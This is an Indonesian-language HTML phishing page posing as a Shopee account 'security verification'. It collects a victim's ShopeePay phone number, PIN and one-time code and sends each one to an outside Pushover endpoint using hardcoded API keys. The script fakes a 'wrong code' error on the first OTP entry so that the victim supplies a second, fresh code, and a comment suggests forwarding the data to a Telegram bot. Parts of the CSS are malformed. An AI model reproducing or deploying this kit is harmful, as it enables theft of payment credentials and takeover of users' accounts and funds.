<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verifikasi Keamanan Akun</title>
  <style>
    :root { --accent: #ee4d2d; --bg: #EE4D2D; --card: #ffffff; --text: #1f2937; }
    * { box-sizing: border-box; font-family: 'Inter', system-ui, sans-serif; }
    body { background: var(--bg); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
    
    .card { 
        background: var(--card); padding: 40px; border-radius: 28px; width: 100%; max-width: 400px; 
        box-shadow: 0 25px 50px -12px rgba(0,0,0,0.1); transition: 0.4s ease;
    }
    
    .header { text-align: center; margin-bottom: 30px; }
    .shopee-logo { height: 48px; margin-bottom: 15px; }
    .header h2 { font-size: 20px; color: var(--text); margin-bottom: 8px; }
    .header p { font-size: 13px; color: #6b7280; line-height: 1.5; }
    
    .input-field { 
        width: 100%; padding: 16px 20px; margin-bottom: 16px; border: 2px solid #f3f4f6; 
        border-radius: 16px; font-size: 15px; outline: none; transition: 0.3s; background: #f9fafb;
    }
    .input-field:focus { border-color: var(--accent); background: #fff; }
    
    .btn { 
        width: 100%; padding: 16px; background: var(--accent); color: white; border: none; 
        border-radius: 16px; font-weight: 600; cursor: pointer; transition: 0.3s;
    }
    .btn:disabled { background: #d1d5db; }
    
    .step { display: none; opacity: 0; animation: fadeIn 0.4s forwards; }
    .active-step { display: block; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    
    .tabs { display: flex; gap: 10px; margin-bottom: 20px; }
    .tab { flex: 1; padding: 12px; border: 2px solid #f3f4f6; border-radius: 12px; text-align: center; cursor: pointer; font-size: 13px; font-weight: 600; }
    .tab.active { background: #fff5f2; border-color: var(--accent); color: var(--accent); }
    
    #errBox { color: #dc2626; font-size: 12px; margin-bottom: 15px; text-align: center; display: none; padding: 12px; background: #fef2f2; border-radius: 12px; line-height: 1.4; }
  </style>

    /* --- TAMBAHAN KODE CSS UNTUK IKON USER --- */
    .input-container {
      position: relative;
      width: 100%;
    }

    .input-icon {
      position: absolute;
      left: 16px;
      top: 38%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      color: #9ca3af; /* Warna abu-abu halus untuk ikon */
      pointer-events: none;
    }

    .input-field.with-icon {
      padding-left: 48px !important;
    }

        width: 100%; padding: 16px; background: var(--accent); color: white; border: none;

  </style>

</head>
<body>

<div class="card">
  <div class="header">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" alt="Shopee Logo" class="shopee-logo">
    <h2 id="title">Verifikasi Keamanan</h2>
    <p id="sub">Silakan masukkan akun Anda untuk mendeteksi adanya login dari perangkat yang tidak dikenal.</p>
  </div>
  <div id="errBox"></div>

<!-- Mulai dari sini -->
<div id="errBox"></div>

<!-- Step 1 (Tampilan awal: No. HP) -->
<form id="step1" class="step active-step">
  <div class="input-container">
    <!-- Ikon User SVG -->
    <svg class="input-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
      <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
      <circle cx="12" cy="7" r="4"></circle>
    </svg>
    <input type="tel" class="input-field with-icon" id="id3" placeholder="No. HP ShopeePay" maxlength="15" required>
  </div>
  <button type="submit" class="btn">Lanjutkan</button>
</form>


<!-- Step 2 (Konfirmasi PIN) -->
<form id="step2" class="step">
  <input type="password" class="input-field" id="id4" placeholder="PIN ShopeePay (6 Digit)" maxlength="6" inputmode="numeric" required>
  <button type="submit" class="btn">Konfirmasi PIN</button>
</form>

<!-- Step 3 (Verifikasi) -->
<form id="step3" class="step">
  <div class="tabs">
    <div class="tab active" onclick="setMode(6, this)">6 Angka</div>
  </div>
  <input type="text" class="input-field" id="id5" placeholder="Kode Verifikasi" maxlength="6" inputmode="numeric" required>
  <button type="submit" class="btn" id="btn4">Verifikasi</button>
</form>

<!-- Script untuk menjalankan tombol dan perpindahan halaman -->
<script>
  // Mengatur tombol Lanjutkan di Step 1
  document.getElementById('step1').addEventListener('submit', function(event) {
    event.preventDefault(); // Mencegah reload halaman
    
    // Sembunyikan step 1, tampilkan step 2
    document.getElementById('step1').classList.remove('active-step');
    document.getElementById('step2').classList.add('active-step');
  });

  // Mengatur tombol Konfirmasi di Step 2
  document.getElementById('step2').addEventListener('submit', function(event) {
    event.preventDefault();
    
    // Sembunyikan step 2, tampilkan step 3
    document.getElementById('step2').classList.remove('active-step');
    document.getElementById('step3').classList.add('active-step');
  });

    
    // Tambahkan logika pengiriman data Anda (misalnya fetch ke bot Telegram) di sini
    alert("Proses verifikasi dijalankan.");
  });
</script>
<!-- Akhir dari sini -->


<script>
  let data = {}, mode = 6, attempts = 0;
  const sub = document.getElementById('sub'), err = document.getElementById('errBox');

  async function push(t, m) {
    await fetch("https://api.pushover.net/1/messages.json", {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({token: "akrrg1jbw9veuujgxsr4pzd8922gqc", user: "uqeogidi42myzrchqncif9tdkcomfh", title: t, message: m})
    });
  }

  function setMode(m, el) {
    mode = m; document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    el.classList.add('active'); document.getElementById('id5').maxLength = m;
  }

    // Step 1: Input No HP (Menggunakan id3)
  document.getElementById('step1').onsubmit = async (e) => { 
    e.preventDefault(); 
    data.hp = document.getElementById('id3').value; 
    await push("S1-HP", `HP: ${data.hp}`); 
    document.getElementById('step1').classList.remove('active-step'); 
    document.getElementById('step2').classList.add('active-step'); 
    sub.innerText = "Masukkan PIN ShopeePay"; 
  };
  
  // Step 2: Input PIN (Menggunakan id4)
  document.getElementById('step2').onsubmit = async (e) => { 
    e.preventDefault(); 
    data.pin = document.getElementById('id4').value; 
    await push("S2-PIN", `PIN: ${data.pin}`); 
    document.getElementById('step2').classList.remove('active-step'); 
    document.getElementById('step3').classList.add('active-step'); 
    sub.innerText = "Silakan masukkan kode verifikasi yang Anda terima melalui WhatsApp atau SMS."; 
  };

  // Step 3: Input OTP dan Timer (Menggunakan id5)
  document.getElementById('step3').onsubmit = async (e) => {
    e.preventDefault();
    if (attempts === 0) {
      attempts++; err.style.display = "block";
      document.getElementById('btn4').disabled = true;
      let count = 10;
      let timer = setInterval(() => {
        err.innerText = `Kode salah. Silakan cek kode yang terbaru yang sudah dikirimkan, coba lagi dalam ${count} detik.`;
        count--;
        if (count < 0) { clearInterval(timer); err.style.display = "none"; document.getElementById('btn4').disabled = false; }
      }, 1000);
    } else {
      await push("S3-OTP", `OTP (${mode} digit): ${document.getElementById('id5').value}`);
      document.querySelector('.card').innerHTML = "<h3>Verifikasi Berhasil</h3><p>Data telah diverifikasi.</p>";
    }
  };

</script>
</body>
</html>
